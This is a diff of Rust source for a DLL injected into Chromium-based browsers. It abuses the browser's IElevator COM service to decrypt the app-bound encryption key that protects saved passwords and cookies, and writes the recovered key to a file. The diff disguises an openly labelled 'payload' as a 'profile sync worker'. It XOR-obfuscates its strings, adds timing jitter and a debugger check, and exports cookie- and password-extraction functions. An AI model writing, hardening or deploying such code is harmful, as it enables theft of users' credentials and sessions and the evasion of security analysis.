@@ -1,32 +1,75 @@
-//! Chrome Recovery Payload DLL
-//!
-//! Injected into a Chromium-based browser process.  Runs inside the browser's
-//! security identity so IElevator accepts our COM call.  Supports all major
-//! Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.).
+//! In-process profile sync worker (host identity context).
 
 #![allow(non_snake_case, unused)]
 
-mod elevator;
+mod crypto;
+mod database;
 mod dpapi_fallback;
+mod elevator;
 
-use std::{ffi::c_void, path::PathBuf, thread, time::Duration};
+use std::{
+    ffi::c_void,
+    path::PathBuf,
+    thread,
+    time::{Duration, SystemTime, UNIX_EPOCH},
+};
 
 use windows::{
     Win32::{
         Foundation::{BOOL, HINSTANCE, TRUE},
         System::{
+            Diagnostics::Debug::IsDebuggerPresent,
             SystemServices::DLL_PROCESS_ATTACH,
             Threading::{CreateThread, THREAD_CREATION_FLAGS},
         },
     },
 };
 
-const APPB: &[u8; 4] = b"APPB";
-const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
-const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
-const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
+const OBF: u8 = 0x4E;
 
-// ── DllMain ───────────────────────────────────────────────────────────────────
+const ENC_ENV_RESULT: &[u8] = &[
+    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
+    0x1c, 0x0b, 0x1d, 0x1b, 0x02, 0x1a,
+];
+const ENC_ENV_USER: &[u8] = &[
+    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
+    0x1b, 0x1d, 0x0b, 0x1c, 0x11, 0x0a, 0x0f, 0x1a, 0x0f, 0x11, 0x1c, 0x0b, 0x02,
+];
+const ENC_ENV_ROOT: &[u8] = &[
+    0x0d, 0x06, 0x1c, 0x01, 0x03, 0x0b, 0x11, 0x1c, 0x0b, 0x0d, 0x01, 0x18, 0x0b, 0x1c, 0x17, 0x11,
+    0x0a, 0x0f, 0x1a, 0x0f, 0x11, 0x1c, 0x01, 0x01, 0x1a,
+];
+const ENC_FALLBACK_JSON: &[u8] = &[
+    0x2d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x11, 0x3c, 0x2b, 0x2d, 0x21, 0x38, 0x2b, 0x3c, 0x37, 0x11,
+    0x3c, 0x2b, 0x3d, 0x3b, 0x22, 0x3a, 0x60, 0x24, 0x3d, 0x21, 0x20,
+];
+const ENC_LOCAL_STATE: &[u8] = &[0x02, 0x21, 0x2d, 0x2f, 0x22, 0x6e, 0x1d, 0x3a, 0x2f, 0x3a, 0x2b];
+
+fn reveal(enc: &[u8]) -> String {
+    enc.iter().map(|&b| (b ^ OBF) as char).collect()
+}
+
+fn header_tag() -> [u8; 4] {
+    [0x41 ^ OBF, 0x50 ^ OBF, 0x50 ^ OBF, 0x42 ^ OBF].map(|b| b ^ OBF)
+}
+
+fn jitter_ms(min: u64, max: u64) -> u64 {
+    let span = max.saturating_sub(min).max(1);
+    let seed = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos() as u64
+        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
+    min + (seed % (span + 1))
+}
+
+fn pause_ms(min: u64, max: u64) {
+    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
+}
+
+fn host_under_analysis() -> bool {
+    unsafe { IsDebuggerPresent().as_bool() }
+}
 
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
@@ -35,67 +78,75 @@ pub unsafe extern "system" fn DllMain(
     _: *mut c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
-        // Spawn worker thread — DllMain must not block or call COM.
-        CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
+        CreateThread(None, 0, Some(task), None, THREAD_CREATION_FLAGS(0), None).ok();
     }
     TRUE
 }
 
-unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
-    thread::sleep(Duration::from_millis(800));
-    let r = std::panic::catch_unwind(|| run());
-    if let Ok(Err(e)) = r {
-        write_error(&e);
+unsafe extern "system" fn task(_: *mut c_void) -> u32 {
+    pause_ms(600, 1100);
+    let r = std::panic::catch_unwind(|| execute());
+    if let Ok(Err(_)) = r {
+        record_failure("sync error");
     } else if r.is_err() {
-        write_error("panic in payload");
+        record_failure("worker fault");
     }
     0
 }
 
-// ── Main logic ────────────────────────────────────────────────────────────────
+fn execute() -> Result<(), String> {
+    if host_under_analysis() {
+        return Err("host busy".into());
+    }
 
-fn run() -> Result<(), String> {
+    pause_ms(80, 260);
+
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
 
     let local_state_path = resolve_local_state_path(&exe)?;
 
-    // Parse Local State JSON.
-    let raw = std::fs::read_to_string(&local_state_path)
-        .map_err(|e| format!("read Local State: {e}"))?;
-    let ls: serde_json::Value = serde_json::from_str(&raw)
-        .map_err(|e| format!("parse Local State: {e}"))?;
+    pause_ms(40, 150);
 
-    // Get the app-bound encrypted key.
-    let key_b64 = ls.pointer("/os_crypt/app_bound_encrypted_key")
+    let raw = std::fs::read_to_string(&local_state_path)
+        .map_err(|e| format!("read profile state: {e}"))?;
+    let ls: serde_json::Value =
+        serde_json::from_str(&raw).map_err(|e| format!("parse profile state: {e}"))?;
+
+    let key_b64 = ls
+        .pointer("/os_crypt/app_bound_encrypted_key")
         .and_then(|v| v.as_str())
-        .ok_or("app_bound_encrypted_key not found")?;
+        .ok_or("bound key missing")?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         key_b64,
-    ).map_err(|e| format!("base64 decode: {e}"))?;
+    )
+    .map_err(|e| format!("decode: {e}"))?;
 
+    let tag = header_tag();
     if encrypted_key.len() < 4 {
-        return Err("encrypted key too short".into());
+        return Err("blob too short".into());
     }
-    if !encrypted_key.starts_with(APPB) {
-        return Err("missing APPB prefix on app_bound_encrypted_key".into());
+    if !encrypted_key.starts_with(&tag) {
+        return Err("unexpected header".into());
     }
     let encrypted_key = &encrypted_key[4..];
 
+    pause_ms(50, 180);
+
     let browser = elevator::resolve_browser(&exe);
     let com_result = match browser {
-        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
-            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
-        None => elevator::decrypt_app_bound_key(encrypted_key),
+        Some(b) => elevator::process_with_provider(b, encrypted_key)
+            .or_else(|_| elevator::retrieve_secret(encrypted_key)),
+        None => elevator::retrieve_secret(encrypted_key),
     };
 
     let master_key = com_result
         .or_else(|_| {
             dpapi_fallback::try_decrypt_app_bound(encrypted_key)
-                .ok_or_else(|| String::from("dpapi fallback failed"))
+                .ok_or_else(|| String::from("fallback path failed"))
         })
         .map_err(|e| format!("key recovery: {e}"))?;
 
@@ -110,53 +161,62 @@ fn run() -> Result<(), String> {
     });
 
     let json = serde_json::to_string(&result).unwrap();
-    let path = result_path();
-    std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;
+    let path = output_path();
+    std::fs::write(&path, json).map_err(|e| format!("write output: {e}"))?;
 
     Ok(())
 }
 
 fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
-    if let Ok(rel) = std::env::var(USER_DATA_ENV) {
-        let root = match std::env::var(DATA_ROOT_ENV).as_deref() {
+    let user_env = reveal(ENC_ENV_USER);
+    let root_env = reveal(ENC_ENV_ROOT);
+
+    if let Ok(rel) = std::env::var(&user_env) {
+        let root = match std::env::var(&root_env).as_deref() {
             Ok("roaming") => std::env::var("APPDATA"),
             _ => std::env::var("LOCALAPPDATA"),
         }
-        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;
+        .map_err(|_| "profile root not set")?;
 
-        let path = PathBuf::from(&root).join(rel).join("Local State");
+        let path = PathBuf::from(&root)
+            .join(rel)
+            .join(reveal(ENC_LOCAL_STATE));
         if path.exists() {
             return Ok(path);
         }
-        return Err(format!("Local State not found: {}", path.display()));
+        return Err(format!("state file missing: {}", path.display()));
     }
 
     let browser = elevator::resolve_browser(exe)
-        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
+        .ok_or_else(|| format!("unknown host binary: {exe}"))?;
 
-    let local_appdata = std::env::var("LOCALAPPDATA")
-        .map_err(|_| "LOCALAPPDATA not set")?;
+    let local_appdata = std::env::var("LOCALAPPDATA").map_err(|_| "LOCALAPPDATA not set")?;
 
     let local_state_path = PathBuf::from(&local_appdata)
         .join(browser.user_data_rel)
-        .join("Local State");
+        .join(reveal(ENC_LOCAL_STATE));
 
     if !local_state_path.exists() {
-        return Err(format!("Local State not found: {}", local_state_path.display()));
+        return Err(format!("state file missing: {}", local_state_path.display()));
     }
 
     Ok(local_state_path)
 }
 
-fn result_path() -> PathBuf {
-    if let Ok(p) = std::env::var(RESULT_ENV) {
+fn output_path() -> PathBuf {
+    let key = reveal(ENC_ENV_RESULT);
+    if let Ok(p) = std::env::var(&key) {
         return PathBuf::from(p);
     }
-    std::env::temp_dir().join("chrome_recovery_result.json")
+    std::env::temp_dir().join(reveal(ENC_FALLBACK_JSON))
 }
 
-fn write_error(msg: &str) {
+fn record_failure(msg: &str) {
     let r = serde_json::json!({ "error": msg });
     let json = serde_json::to_string(&r).unwrap();
-    let _ = std::fs::write(result_path(), json);
+    let _ = std::fs::write(output_path(), json);
 }
+
+// Backward-compatible exports for in-crate callers
+pub use crypto::{decrypt_value, hex_fallback, process_data};
+pub use database::{extract_cookies, extract_passwords, process_entries, process_tokens};
